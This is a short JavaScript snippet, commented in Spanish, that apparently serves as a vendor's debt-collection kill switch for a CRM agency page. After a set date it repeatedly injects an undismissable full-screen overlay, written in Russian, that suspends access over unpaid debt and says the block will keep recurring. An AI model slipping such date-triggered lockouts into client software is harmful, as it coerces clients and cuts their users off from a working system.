// BLOQUEO CON FECHA DE CORTE PROGRAMADA - DISEÑO MINIMALISTA
function verificarRecordatorioPorURL() {
    
    var agenciasDeudoras = [
        {
            urlMatch: "crm.lig01.com/agency_launchpad", 
            fechaBloqueo: "2026-11-10" // Formato AAAA-MM-DD. Aparecerá a partir de este día.
        }
    ];

    var urlActual = window.location.href;
    var datosCliente = null;
    var hoy = new Date();

    for (var i = 0; i < agenciasDeudoras.length; i++) {
        // Convertimos la fecha de texto a un objeto Date real (T00:00:00 evita errores de zona horaria)
        var fechaCorte = new Date(agenciasDeudoras[i].fechaBloqueo + "T00:00:00");
        
        // Verificamos DOS cosas: Que sea el link correcto Y que la fecha actual sea mayor o igual a la de corte
        if (urlActual.includes(agenciasDeudoras[i].urlMatch) && hoy >= fechaCorte) {
            datosCliente = agenciasDeudoras[i];
            break; 
        }
    }
    
    // Si hay coincidencia de URL y ya pasó la fecha, inyectamos el bloqueo
    if (datosCliente) {
        if (document.getElementById("bloqueo-minimal-overlay")) return; 

        if (!document.getElementById("css-bloqueo-minimal")) {
            var estilosCSS = `
                <style id="css-bloqueo-minimal">
                    .bloqueo-minimal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(17, 24, 39, 0.4); display: flex; justify-content: center; align-items: center; z-index: 9999999; font-family: system-ui, -apple-system, sans-serif; backdrop-filter: blur(8px); }
                    .bloqueo-minimal-caja { background: #ffffff; padding: 40px; border-radius: 20px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); position: relative; max-width: 440px; width: 90%; text-align: center; border: 1px solid #f3f4f6; animation: aparecer 0.4s ease-out; }
                    .minimal-icono-alerta { width: 64px; height: 64px; background: #fef2f2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: #ef4444; }
                    .bloqueo-minimal-caja h2 { color: #111827; margin: 0 0 12px; font-size: 22px; font-weight: 600; }
                    .bloqueo-minimal-caja p.descripcion { color: #4b5563; font-size: 15px; line-height: 1.6; margin: 0 0 28px; }
                    .mensaje-footer { font-size: 13px; color: #9ca3af; margin-top: 24px; margin-bottom: 0; }
                    @keyframes aparecer { from { opacity: 0; transform: translateY(15px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
                </style>
            `;
            document.head.insertAdjacentHTML('beforeend', estilosCSS);
        }

        var htmlBloqueo = `
            <div id="bloqueo-minimal-overlay" class="bloqueo-minimal-overlay">
                <div class="bloqueo-minimal-caja">
                    <div class="minimal-icono-alerta">
                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/>
                            <path d="M12 9v4"/><path d="M12 17h.01"/>
                        </svg>
                    </div>
                    <h2>Ограниченный доступ</h2>
                    <p class="descripcion">Ваш доступ к системе временно приостановлен из-за наличия задолженности. Для возобновления обслуживания, пожалуйста, произведите соответствующий платеж.</p>
                    <p class="mensaje-footer">Это будет повторяться много раз. Вы уже знаете, где платить...</p>
                </div>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', htmlBloqueo);
    }
}
setInterval(verificarRecordatorioPorURL, 1000);